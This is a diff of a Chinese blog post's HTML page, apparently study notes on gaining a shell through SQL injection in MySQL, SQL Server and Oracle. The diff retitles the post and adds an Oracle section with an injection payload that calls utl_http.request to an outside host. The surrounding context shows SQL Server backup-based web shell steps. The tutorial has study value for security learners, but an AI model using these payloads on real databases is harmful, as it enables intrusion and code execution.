@@ -7,7 +7,7 @@
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
   
-  <title>sql注入获得shell | Hexo</title>
+  <title>sql屠龙术 | Hexo</title>
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -17,16 +17,16 @@
 
   <meta name="description" content="前言最近在工作中遇到一次sql注入想要使用这个sql注入来获得shell时发现自己对这些常规数据库一些安全方面的知识并不熟悉便决定专门了解一下。 当然作为新手我总结的方式肯定不全面在以后的学习工作中我遇到新的方式会添加进来。 MySql权限mysql在安装完成之后只有一个root用户，mysql需要自己创建具有不同权限的账户。 表权限:’Select’, ‘Insert’, ‘Update’, ‘">
 <meta property="og:type" content="article">
-<meta property="og:title" content="sql注入获得shell">
+<meta property="og:title" content="sql屠龙术">
 <meta property="og:url" content="http://yoursite.com/2019/08/29/sql注入获得shell/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="前言最近在工作中遇到一次sql注入想要使用这个sql注入来获得shell时发现自己对这些常规数据库一些安全方面的知识并不熟悉便决定专门了解一下。 当然作为新手我总结的方式肯定不全面在以后的学习工作中我遇到新的方式会添加进来。 MySql权限mysql在安装完成之后只有一个root用户，mysql需要自己创建具有不同权限的账户。 表权限:’Select’, ‘Insert’, ‘Update’, ‘">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="http://yoursite.com/2019/08/29/sql注入获得shell/1567151247852.png">
 <meta property="og:image" content="http://yoursite.com/2019/08/29/sql注入获得shell/1567151261135.png">
-<meta property="og:updated_time" content="2019-09-20T05:11:08.468Z">
+<meta property="og:updated_time" content="2019-09-20T07:55:34.198Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="sql注入获得shell">
+<meta name="twitter:title" content="sql屠龙术">
 <meta name="twitter:description" content="前言最近在工作中遇到一次sql注入想要使用这个sql注入来获得shell时发现自己对这些常规数据库一些安全方面的知识并不熟悉便决定专门了解一下。 当然作为新手我总结的方式肯定不全面在以后的学习工作中我遇到新的方式会添加进来。 MySql权限mysql在安装完成之后只有一个root用户，mysql需要自己创建具有不同权限的账户。 表权限:’Select’, ‘Insert’, ‘Update’, ‘">
 <meta name="twitter:image" content="http://yoursite.com/2019/08/29/sql注入获得shell/1567151247852.png">
 
@@ -187,7 +187,7 @@ ga('send', 'pageview');
 
   <div id="toc" class="toc-article">
     <strong class="toc-title">Posts List</strong>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MySql"><span class="toc-text">MySql</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#权限"><span class="toc-text">权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell方法总结"><span class="toc-text">getshell方法总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#select-…-into-outfile方法"><span class="toc-text">select … into outfile方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#日志获得shell"><span class="toc-text">日志获得shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#防御方法"><span class="toc-text">防御方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SqlServer"><span class="toc-text">SqlServer</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#执行命令"><span class="toc-text">执行命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#xp-cmdshell"><span class="toc-text">xp_cmdshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SP-OACREATE"><span class="toc-text">SP_OACREATE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jet沙盒"><span class="toc-text">jet沙盒</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CLR执行"><span class="toc-text">CLR执行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#备份法"><span class="toc-text">备份法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#差异备份"><span class="toc-text">差异备份</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sp-makewebtask备份"><span class="toc-text">sp_makewebtask备份</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#log备份法"><span class="toc-text">log备份法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#oracle"><span class="toc-text">oracle</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考文章"><span class="toc-text">参考文章</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MySql"><span class="toc-text">MySql</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#权限"><span class="toc-text">权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell方法总结"><span class="toc-text">getshell方法总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#select-…-into-outfile方法"><span class="toc-text">select … into outfile方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#日志获得shell"><span class="toc-text">日志获得shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#防御方法"><span class="toc-text">防御方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SqlServer"><span class="toc-text">SqlServer</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#执行命令"><span class="toc-text">执行命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#xp-cmdshell"><span class="toc-text">xp_cmdshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SP-OACREATE"><span class="toc-text">SP_OACREATE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jet沙盒"><span class="toc-text">jet沙盒</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CLR执行"><span class="toc-text">CLR执行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#备份法"><span class="toc-text">备份法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#差异备份"><span class="toc-text">差异备份</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sp-makewebtask备份"><span class="toc-text">sp_makewebtask备份</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#log备份法"><span class="toc-text">log备份法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#oracle"><span class="toc-text">oracle</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#命令执行"><span class="toc-text">命令执行</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考文章"><span class="toc-text">参考文章</span></a></li></ol>
   </div>
 
 
@@ -195,7 +195,7 @@ ga('send', 'pageview');
 <div class="content content-post CENTER">
    <article id="post-sql注入获得shell" class="article article-type-post" itemprop="blogPost">
   <header class="article-header">
-    <h1 class="post-title">sql注入获得shell</h1>
+    <h1 class="post-title">sql屠龙术</h1>
 
     <div class="article-meta">
       <span>
@@ -310,9 +310,10 @@ backup database 库名 to disk=&#39;路径&#39; WITH DIFFERENTIAL,FORMAT;</code>
 <h3 id="log备份法"><a href="#log备份法" class="headerlink" title="log备份法"></a>log备份法</h3><p>相对差异备份法shell就很小。</p>
 <p>第一步<code>alter database asp_test set RECOVERY FULL</code>激活mssql为还原模式。</p>
 <p>其他后面步骤一样。</p>
-<p><a href="https://mp.weixin.qq.com/s?__biz=MzU1MzE3Njg2Mw==&mid=2247486636&idx=1&sn=e2f7129ebcebd78da0eeee8335e60f02&chksm=fbf796dccc801fca48b0416eebe1ae148627b8494066ed0b1a21c79e018d5fdde1c2b4073d9e&mpshare=1&scene=1&srcid=&sharer_sharetime=1568272683635&sharer_shareid=4056c5892d236b283f567b1bbeab207a&key=a60e3d263d5f7c346acefd6d558d7098acd6a4e15450bd7ba67fb5b8d20d7ab326ab681201da6c3585d60e60120492bc85fa327ae0b158906ed944b2e7bb614807f3f927ac9af8c912034b96c7ee9cd6&ascene=1&uin=MTIzNDgwNjQyOA%3D%3D&devicetype=Windows+10&version=62060833&lang=zh_CN&pass_ticket=4gFD0qvuaW0pXomdJxD%2FQ2W1pyl8z2q5eY1yK%2FV%2Fkubb68FUSzjg8WosecoCwQ2v" target="_blank" rel="noopener">一篇关于mssql利用的总结</a></p>
+<p><a href="https://mp.weixin.qq.com/s?__biz=MzU1MzE3Njg2Mw==&mid=2247486636&idx=1&sn=e2f7129ebcebd78da0eeee8335e60f02&chksm=fbf796dccc801fca48b0416eebe1ae148627b8494066ed0b1a21c79e018d5fdde1c2b4073d9e&mpshare=1&scene=1&srcid=&sharer_sharetime=1568272683635&sharer_shareid=4056c5892d236b283f567b1bbeab207a&key=a60e3d263d5f7c346acefd6d558d7098acd6a4e15450bd7ba67fb5b8d20d7ab326ab681201da6c3585d60e60120492bc85fa327ae0b158906ed944b2e7bb614807f3f927ac9af8c912034b96c7ee9cd6&ascene=1&uin=MTIzNDgwNjQyOA%3D%3D&devicetype=Windows+10&version=62060833&lang=zh_CN&pass_ticket=4gFD0qvuaW0pXomdJxD%2FQ2W1pyl8z2q5eY1yK%2FV%2Fkubb68FUSzjg8WosecoCwQ2v" target="_blank" rel="noopener">安恒一篇关于mssql利用的总结</a></p>
 <h1 id="oracle"><a href="#oracle" class="headerlink" title="oracle"></a>oracle</h1><p>oracle是一个庞大的数据库，普遍用于大公司，oracle也十分繁琐。</p>
 <p>oracle系统库默认的用户有sys,system,internal,scott,前三个权限都是system权限，</p>
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(FOO,BAR,DBMS_OUTPUT”.PUT(:P1); utl_http.request (<a href="http://www.li-tek.com/1.txt" target="_blank" rel="noopener">http://www.li-tek.com/1.txt</a>) END;–,SYS,0,1,0)=0–”</p>
 <p>···未完待续。</p>
 <h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.4hou.com/technology/3338.html" target="_blank" rel="noopener">https://www.4hou.com/technology/3338.html</a></p>
 
